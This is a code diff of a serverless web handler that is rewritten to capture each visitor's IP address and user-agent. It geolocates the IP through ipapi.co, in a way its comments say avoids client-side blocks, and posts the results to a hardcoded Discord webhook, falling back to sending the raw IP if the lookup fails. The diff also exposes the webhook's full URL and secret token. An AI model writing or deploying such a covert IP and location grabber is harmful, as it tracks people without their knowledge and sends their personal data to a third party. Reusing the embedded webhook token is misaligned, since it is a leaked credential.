@@ -1,27 +1,37 @@
 export default async function handler(req, res) {
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
-    }
+    // Get IP from Vercel headers
+    const forwarded = req.headers['x-forwarded-for'];
+    const ip = forwarded ? forwarded.split(/, /)[0] : req.socket.remoteAddress;
 
-    const { ip, city, region, country_name } = req.body;
     const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';
 
     try {
-        const response = await fetch(webhookUrl, {
+        // Perform server-side lookup for more accuracy and to avoid client-side blocks
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoResponse.json();
+
+        const { city, region, country_name } = geoData;
+
+        // Log to Discord
+        await fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: `📍 **New visitor tracked!**\n**IP**: ${ip || 'Unknown'}\n**Location**: ${city || 'Unknown'}, ${region || 'Unknown'}, ${country_name || 'Unknown'}\n**Time**: ${new Date().toLocaleString()}`
+                content: `🚀 **Mobile-Reliable Visit!**\n**IP**: ${ip}\n**Location**: ${city || 'Unknown'}, ${region || 'Unknown'}, ${country_name || 'Unknown'}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`
             })
         });
 
-        if (!response.ok) {
-            throw new Error(`Discord API responded with ${response.status}`);
-        }
-
-        return res.status(200).json({ success: true });
+        return res.status(200).json({ ip, city, region, country_name });
     } catch (error) {
         console.error('Logging error:', error);
-        return res.status(500).json({ error: 'Failed to log data' });
+        // Even if geo-lookup fails, try to log the raw IP
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `⚠️ **Visit logged (Geo-lookup failed)**\n**IP**: ${ip}\n**Time**: ${new Date().toLocaleString()}`
+            })
+        });
+        return res.status(200).json({ ip });
     }
 }
